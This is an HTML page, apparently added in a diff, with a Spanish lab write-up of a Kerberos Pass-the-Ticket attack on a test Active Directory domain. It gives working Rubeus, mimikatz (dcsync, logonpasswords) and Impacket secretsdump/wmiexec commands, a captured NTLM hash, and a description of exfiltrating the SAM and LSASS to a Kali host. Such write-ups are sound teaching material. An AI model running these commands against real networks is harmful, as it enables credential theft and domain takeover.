@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pass the Ticket - Ernesto Villar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="article-style.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="nav-left">
+      <a href="index.html" style="text-decoration: none; color: inherit;"><span class="nav-logo">Ernesto Villar</span></a>
+    </div>
+    <div class="nav-right">
+      <ul>
+        <li><a href="#" class="active">Documentación</a></li>
+        <li><a href="ernestoo-v.github.io-main/pdf/pass_the_ticket.pdf" download class="download-btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 12px rgba(102, 126, 234, 0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+          Descargar PDF
+        </a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <article class="article-container">
+    <header class="article-header">
+      <h1 class="article-title">Pass the Ticket</h1>
+      <p class="article-subtitle">Ataque de suplantación mediante tickets Kerberos</p>
+      <div class="article-meta">
+        <span class="author">Por Ernesto Villar</span>
+      </div>
+    </header>
+
+    <nav class="table-of-contents">
+      <h2>Contenido</h2>
+      <ul>
+        <li><a href="#resumen">Resumen</a></li>
+        <li><a href="#conceptos">Conceptos esenciales de Kerberos</a></li>
+        <li><a href="#rubeus">Rubeus: visión general</a></li>
+        <li><a href="#pasos">Pasos del Ataque</a>
+          <ul>
+            <li><a href="#obtencion-tgt">Obtención del TGT</a></li>
+            <li><a href="#importacion-tgt">Importación del TGT</a></li>
+            <li><a href="#obtencion-tgs">Obtención del TGS</a></li>
+            <li><a href="#importacion-tgs">Importación del TGS</a></li>
+            <li><a href="#ticket-ldap">Ticket con service LDAP</a></li>
+            <li><a href="#comprobacion">Comprobación</a></li>
+          </ul>
+        </li>
+        <li><a href="#kerberoasting">Hashes de SPN (Kerberoasting)</a></li>
+        <li><a href="#hash-krbtgt">Hash NTLM KRBTGT</a></li>
+        <li><a href="#sam">SAM del equipo</a></li>
+        <li><a href="#wmiexec">Ejecución remota con wmiexec</a></li>
+        <li><a href="#lsass">LSASS del equipo</a></li>
+      </ul>
+    </nav>
+
+    <section id="resumen" class="article-section">
+      <h2>Resumen</h2>
+      <p>En un ataque <strong>Pass-the-Ticket (PtT)</strong> se roba un Ticket-Granting Ticket (TGT) o un Ticket-Granting Service (TGS) y se inyecta ("se pasa") en la caché Kerberos de una sesión para suplantar a otro usuario sin conocer su contraseña. Con Rubeus realizaste los cuatro pasos canónicos: 1) solicitar un TGT con asktgt usando la contraseña del Administrador, 2) inyectar ese TGT en la sesión con ptt, 3) pedir un TGS específico (CIFS o LDAP) con asktgs empleando el TGT robado, y 4) volver a inyectar el nuevo TGS con ptt. Las verificaciones con klist y con <code>dir\\PRINCIPAL-BLEACH.BLEACH.local\c$</code> confirmaron que los tickets estaban activos y permitían acceso al recurso SMB.</p>
+    </section>
+
+    <section id="conceptos" class="article-section">
+      <h2>Conceptos esenciales de Kerberos y Pass-the-Ticket</h2>
+      
+      <div class="config-section">
+        <div class="config-item">
+          <div class="config-explanation">
+            <p><strong>TGT (Ticket-Granting Ticket):</strong> Credencial cifrada que el KDC devuelve tras la autenticación inicial y que permite solicitar TGS sin volver a enviar la contraseña.</p>
+          </div>
+        </div>
+
+        <div class="config-item">
+          <div class="config-explanation">
+            <p><strong>TGS (Service Ticket):</strong> Se emite cuando el cliente presenta un TGT válido y especifica un Service Principal Name (SPN), por ejemplo <code>cifs/servidor</code>.</p>
+          </div>
+        </div>
+
+        <div class="config-item">
+          <div class="config-explanation">
+            <p><strong>SPN:</strong> Identificador único de un servicio en Kerberos; para SMB suele ser <code>cifs/&lt;HOST&gt;</code>.</p>
+          </div>
+        </div>
+
+        <div class="config-item">
+          <div class="config-explanation">
+            <p><strong>Pass-the-Ticket:</strong> Técnica que consiste en capturar e inyectar tickets ya generados (TGT o TGS) para autenticarse como otra cuenta.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="rubeus" class="article-section">
+      <h2>Rubeus: visión general y sintaxis clave</h2>
+      <p>Rubeus es una herramienta de post-explotación escrita en C# (GhostPack) que permite manipular el protocolo Kerberos: solicitar, renovar, descifrar e inyectar tickets. Las opciones se encadenan como parámetros: <code>/user</code>, <code>/password</code>, <code>/ticket</code>, <code>/service</code>, <code>/ptt</code>, <code>/nowrap</code>.</p>
+    </section>
+
+    <section id="pasos" class="article-section">
+      <h2>Pasos del Ataque</h2>
+
+      <div id="obtencion-tgt" class="subsection">
+        <h3>Obtención del TGT</h3>
+        
+        <div class="command-block">
+          <pre><code>.\Rubeus.exe asktgt /user:Administrador /password:admin1 /nowrap</code></pre>
+        </div>
+
+        <div class="config-section">
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>asktgt:</strong> envía un mensaje AS-REQ con el usuario y la contraseña (o hash) para que el KDC devuelva un AS-REP que contiene el TGT.</p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>/user y /password:</strong> credenciales que se usarán para cifrar la parte secreta del ticket.</p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>/nowrap:</strong> entrega el TGT en Base64 continuo, eliminando los saltos de línea RFC2045 (76 bytes), lo que facilita copiarlo a la línea de comandos o a un fichero.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- PLACEHOLDER 1: Screenshot of Rubeus asktgt output -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.30.33-a4u2b7oD98RM12H1Rruoa1y3Pz7xbB.png" alt="Obtención del TGT con Rubeus" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando Rubeus asktgt y TGT obtenido del Administrador</p>
+        </div>
+      </div>
+
+      <div id="importacion-tgt" class="subsection">
+        <h3>Importación del TGT</h3>
+        
+        <div class="command-block">
+          <pre><code>.\Rubeus.exe ptt /ticket:"&lt;ticketb64&gt;"</code></pre>
+        </div>
+
+        <p><strong>ptt (Pass-the-Ticket):</strong> decodifica el blob Base64 (.kirbi) y lo inyecta en la memoria de la sesión Kerberos (LSASS). A partir de ese momento el sistema cree que tu sesión posee un TGT legítimo del Administrador.</p>
+
+        <!-- PLACEHOLDER 2: Screenshot of Rubeus ptt import -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.11-g4uWDKoS0SJ8vUjk1YvUSlWxzaHDoe.png" alt="Importación del TGT" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Inyección del TGT en la sesión - Ticket successfully imported</p>
+        </div>
+      </div>
+
+      <div id="obtencion-tgs" class="subsection">
+        <h3>Obtención del TGS usando el ticket TGT</h3>
+        
+        <div class="command-block">
+          <pre><code>.\Rubeus.exe asktgs /user:Administrador /ticket:&lt;b64-ticket&gt; /service:cifs/PRINCIPAL-BLEACH.BLEACH.local /nowrap</code></pre>
+        </div>
+
+        <div class="config-section">
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>asktgs:</strong> construye un TGS-REQ utilizando el TGT inyectado (vía /ticket:) y pide un ticket de servicio.</p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>/service:cifs/...:</strong> SPN que identifica el recurso SMB (\\PRINCIPAL-BLEACH.BLEACH.local). Windows traducirá un acceso UNC a un SPN <code>cifs/&lt;host&gt;</code>.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Añadidas 2 imágenes en lugar de 1 -->
+        <!-- PLACEHOLDER 3: Screenshot of Rubeus asktgs command -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.30.51-wWto2ZDZEGHWl8jWP8L9sfLjk8Tb2s.png" alt="Comando asktgs" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando Rubeus asktgs para servicio CIFS</p>
+        </div>
+
+        <!-- PLACEHOLDER 4: Screenshot of TGS obtenido -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.30.57-Qvq6I6jSVkX4PeNBtFm0iOm7VxbcgC.png" alt="TGS obtenido" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">TGS para servicio CIFS obtenido exitosamente</p>
+        </div>
+      </div>
+
+      <div id="importacion-tgs" class="subsection">
+        <h3>Importación del TGS</h3>
+        
+        <div class="command-block">
+          <pre><code>.\Rubeus.exe ptt /ticket:"&lt;ticketb64&gt;"</code></pre>
+        </div>
+
+        <!-- PLACEHOLDER 5: Screenshot of TGS import -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.30.43-cKc4hK3O3s10jcwRAN1LJGPL8InZ5L.png" alt="Importación del TGS" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Inyección del TGS CIFS en la sesión</p>
+        </div>
+      </div>
+
+      <div id="ticket-ldap" class="subsection">
+        <h3>Obtener el ticket con service LDAP</h3>
+        
+        <div class="command-block">
+          <pre><code>.\Rubeus.exe asktgs /user:Administrador /ticket:"EL_TGT_DE_ADMINISTRADOR" /service:ldap/PRINCIPAL-BLEACH.BLEACH.local /ptt</code></pre>
+        </div>
+
+        <div class="info-box">
+          <p><strong>Nota:</strong> No se hizo captura desde la reverse, pero se incluye una captura desde la propia Windows.</p>
+        </div>
+
+        <p><strong>/ptt</strong> al final automatiza la inyección del ticket recién emitido, evitando ejecutar un ptt adicional. Tras esto podrías usar herramientas LDAP (ADSIEdit, ldp.exe, etc.) autenticado como Administrador.</p>
+
+        <!-- PLACEHOLDER 6: Screenshot of LDAP ticket -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.22-EK2AH8P3LStgnPvpYtsOraqUPrV56B.png" alt="Ticket LDAP obtenido" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Obtención de ticket para servicio LDAP con inyección automática</p>
+        </div>
+      </div>
+
+      <div id="comprobacion" class="subsection">
+        <h3>Comprobación</h3>
+        
+        <h4>klist</h4>
+        <div class="command-block">
+          <pre><code>klist</code></pre>
+        </div>
+
+        <p><strong>klist</strong> lista los tickets presentes en la credencial cache y muestra su validez, SPN y tiempos de renovación.</p>
+
+        <!-- PLACEHOLDER 7: Screenshot of klist output -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.31-jFjEoYOce0fe6oOPVDcOWComCahopW.png" alt="Listado de tickets con klist" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Verificación de tickets activos: krbtgt, cifs y ldap</p>
+        </div>
+
+        <h4>Prueba de acceso al recurso SMB</h4>
+        <div class="command-block">
+          <pre><code>dir "//PRINCIPAL-BLEACH.BLEACH.local/c$"</code></pre>
+        </div>
+
+        <p>El comando usa el TGS inyectado para autenticar la sesión SMB y listar el disco C$ remoto. Si la lista de directorios aparece, el PtT fue exitoso.</p>
+
+        <!-- PLACEHOLDER 8: Screenshot of dir command output -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.39-aosPRy4QbC630aKcaWAeEDJxN7olWb.png" alt="Acceso exitoso al recurso SMB" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Acceso exitoso al disco C$ remoto - Pass-the-Ticket confirmado</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="kerberoasting" class="article-section">
+      <h2>Hashes de SPN (Kerberoasting)</h2>
+      
+      <div class="command-block">
+        <pre><code>.\Rubeus.exe kerberoast /format:hashcat /outfile:C:\Users\jquerito\Downloads\ghost\Ghostpack-CompiledBinaries-master/spn_hashes.txt</code></pre>
+      </div>
+
+      <!-- Añadidas 2 imágenes en lugar de 1 -->
+      <!-- PLACEHOLDER 9: Screenshot of kerberoast command -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.48-lulZK55W3v9wtykblw2A5VHxYzW6OO.png" alt="Comando kerberoast" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando Rubeus kerberoast - 4 usuarios kerberoastables encontrados</p>
+      </div>
+
+      <!-- PLACEHOLDER 10: Screenshot of hashes extraídos -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.31.57-uliIc6kattFDmfR7GwB4ktCvW8p7mh.png" alt="Hashes SPN extraídos" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Hashes SPN extraídos: exchange_svc, http_svc, mssql_svc, SQLService</p>
+      </div>
+    </section>
+
+    <section id="hash-krbtgt" class="article-section">
+      <h2>Hash NTLM KRBTGT</h2>
+      
+      <div class="command-block">
+        <pre><code>.\mimikatz.exe "lsadump::dcsync /domain:BLEACH.local /user:krbtgt" exit</code></pre>
+      </div>
+
+      <!-- Añadidas imágenes 11-12: mimikatz dcsync krbtgt -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.48.42-kUhVybFmwI9NN3WbG5YAozJ2HE4hpv.png" alt="Comando mimikatz dcsync krbtgt" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando mimikatz dcsync para krbtgt</p>
+      </div>
+
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.48.55-scKJ2Vw3wmIh7GfqRx5fd0qPeGg9fx.png" alt="Hash KRBTGT extraído" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Hash NTLM de la cuenta KRBTGT</p>
+      </div>
+    </section>
+
+    <section id="sam" class="article-section">
+      <h2>SAM del equipo</h2>
+      
+      <p>Primero sacamos el hash NTLM del administrador. Comprobamos que tenemos el ticket de administrador:</p>
+
+      <!-- Añadida imagen 13: verificación de ticket -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.04-HGvq4rh6eHE13aCXS3DRX1ga5CQKRz.png" alt="Verificación de ticket de administrador" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Verificación del ticket de administrador con klist</p>
+      </div>
+
+      <div class="command-block">
+        <pre><code>.\mimikatz.exe "lsadump::dcsync /domain:BLEACH.local /user:Administrador" exit</code></pre>
+      </div>
+
+      <div class="info-box">
+        <p>Ejecuta el módulo <strong>lsadump::dcsync</strong>, que simula ser un controlador de dominio y solicita al DC las credenciales del usuario <strong>Administrador</strong>.</p>
+        <p>Devuelve hashes NTLM, LM, y el hash de Kerberos (AES) del usuario solicitado. Necesita privilegios de Domain Admin o replication rights en el dominio.</p>
+        <p><strong>Hash NTLM del administrador obtenido:</strong> <code>:74561893ea1e32f1fab1691c56f6c7a5</code></p>
+      </div>
+
+      <!-- Añadidas imágenes 14-15: mimikatz dcsync Administrador -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.16-67IATsot1vlfa9Qjy8SQbxjTVTIPRJ.png" alt="Comando dcsync Administrador" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando mimikatz dcsync para Administrador</p>
+      </div>
+
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.24-u6ZuZ75F17w37X2WgN3PexqPuF6xxa.png" alt="Hash del Administrador extraído" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Hashes NTLM del Administrador extraído con credenciales completas</p>
+      </div>
+    </section>
+
+    <section id="wmiexec" class="article-section">
+      <h2>Ejecución remota con wmiexec desde Kali</h2>
+      
+      <p>Utilizamos el repositorio <a href="https://github.com/fortra/impacket.git" target="_blank">https://github.com/fortra/impacket.git</a></p>
+
+      <h3>Exfiltración de la SAM</h3>
+      <div class="command-block">
+        <pre><code>python3 secretsdump.py -hashes :74561893ea1e32f1fab1691c56f6c7a5 BLEACH.local/Administrador@10.0.2.5</code></pre>
+      </div>
+
+      <!-- Añadida imagen 16: comando secretsdump -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.33-ZhFkRi8lrr3Q1INyct8pHN6ApM4PeG.png" alt="Comando secretsdump" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Ejecución de secretsdump.py - Dump de SAM, LSA Secrets y NLSKM</p>
+      </div>
+
+      <p><strong>Obtenemos las SAM</strong></p>
+
+      <!-- Añadida imagen 17: SAM obtenida -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.40-u0eB6hLSNcRNNzxSLnzEc07n6hPOF7.png" alt="SAM extraída" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Hashes NTLM de usuarios del dominio extraídos</p>
+      </div>
+
+      <div class="info-box">
+        <p><strong>secretsdump.py</strong> (de Impacket) permite extraer secretos del sistema remoto (SAM, LSA, NTDS) sin necesidad de contraseña, solo con un hash NTLM.</p>
+        <p>El parámetro <code>-hashes :7456...</code> indica que no se proporciona hash LM (está vacío) y solo se usará el hash NTLM (<code>74561893ea1e32f1fab1691c56f6c7a5</code>) para autenticarse (Pass-the-Hash).</p>
+        <p><code>BLEACH.local/Administrador@10.0.2.5</code>: conecta al host remoto con el usuario <strong>Administrador</strong> del dominio <strong>BLEACH.local</strong>.</p>
+      </div>
+
+      <div class="command-block">
+        <pre><code>python3 wmiexec.py -hashes :74561893ea1e32f1fab1691c56f6c7a5 BLEACH.local/Administrador@10.0.2.5</code></pre>
+      </div>
+
+      <!-- Añadida imagen 18: wmiexec -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.49.52-6JXzvlfSKUcnZS5cb22nW3CY99N8H6.png" alt="Ejecución remota con wmiexec" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Shell remota obtenida con wmiexec - SMBv3.0 dialect used</p>
+      </div>
+
+      <div class="info-box">
+        <p>Ejecuta comandos remotamente en la máquina Windows (<code>10.0.2.5</code>) usando WMI.</p>
+        <p>Utiliza autenticación por hash NTLM. La cadena <code>-hashes :&lt;NTLM&gt;</code> indica que solo se proporciona el hash NTLM.</p>
+      </div>
+
+      <p>Ahora que ya tenemos la SAM del administrador para crear una nueva reverse shell:</p>
+
+      <!-- Añadidas imágenes 19-20: reverse shell setup -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.50.01-6ZJTmQoK6KkJQeiQZDBL1H4r1lZZml.png" alt="Configuración de reverse shell con Metasploit" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Configuración de Metasploit psexec con hash NTLM - Meterpreter session opened</p>
+      </div>
+
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.50.11-nD1XzQiXMvnIaTLQ8LA0JsdgzMRhHk.png" alt="Verificación de privilegios SYSTEM" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Verificación de privilegios: NT AUTHORITY\SYSTEM obtenido</p>
+      </div>
+
+      <h3>Abrimos una shell y dumpeamos el system, la sam y el security</h3>
+
+      <!-- PLACEHOLDER 21: Screenshot of dump of system, sam and security -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.58.55-cFhCLUWlCkMtloX4OF6TOfhZTdXX1E.png" alt="Dump de system, sam y security" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Extracción de archivos system, sam y security con reg save desde shell SYSTEM</p>
+      </div>
+
+      <h3>Me guardo los ficheros en la kali</h3>
+
+      <!-- PLACEHOLDER 22: Screenshot of files saved in Kali -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.02-14FC0ELgZdn8H8Y4L8htJ8gqcLuoF2.png" alt="Descarga de archivos system, sam y security a Kali" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Descarga de archivos system, sam y security a Kali con meterpreter</p>
+      </div>
+    </section>
+
+    <section id="lsass" class="article-section">
+      <h2>LSASS del equipo</h2>
+      
+      <p>Para el lsass ejecutamos mimikatz como system32:</p>
+
+      <div class="command-block">
+        <pre><code>.\mimikatz.exe "sekurlsa::logonpasswords" exit > lsass.dmp</code></pre>
+      </div>
+
+      <!-- PLACEHOLDER 23: Screenshot of mimikatz lsass dump 1 -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.10-i5RJin0ImSIkAxCDyL4YkZpPWxrs9p.png" alt="Comando mimikatz redirigido a lsass.dmp" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Comando mimikatz sekurlsa::logonpasswords redirigido a lsass.dmp</p>
+      </div>
+
+      <!-- PLACEHOLDER 24: Screenshot of download lsass.dmp start -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.26-pVy5TtUNuJrsum6ZGazWJnllwCI9AY.png" alt="Inicio de descarga de lsass.dmp" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Inicio de descarga de lsass.dmp desde meterpreter</p>
+      </div>
+
+      <!-- PLACEHOLDER 25: Screenshot of download lsass.dmp completed -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.33-CWyfNdZ4l91vFfabCJEqMUWVNn6AE9.png" alt="Descarga de lsass.dmp completada" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Descarga de lsass.dmp completada - archivo transferido a Kali</p>
+      </div>
+
+      <!-- PLACEHOLDER 26: Screenshot of ls grep verification -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.40-Yh7ddusrvuUbpQbxYAhM7Iz8TqZK4I.png" alt="Verificación de archivos en Kali" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Verificación de archivos descargados en Kali: sam, security, system y lsass.dmp</p>
+      </div>
+
+      <!-- PLACEHOLDER 27: Screenshot of mimikatz sekurlsa output -->
+      <div class="image-container">
+        <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2019.59.19-8gC6rvEJjVrEHV5eAtUYKe9iQSwjqk.png" alt="Output de sekurlsa::logonpasswords" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+        <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Credenciales extraídas con sekurlsa::logonpasswords - Administrador y jquerito</p>
+      </div>
+    </section>
+
+    <footer class="article-footer">
+      <p>Documento educativo sobre seguridad de sistemas - Ernesto Villar</p>
+    </footer>
+  </article>
+</body>
+</html>
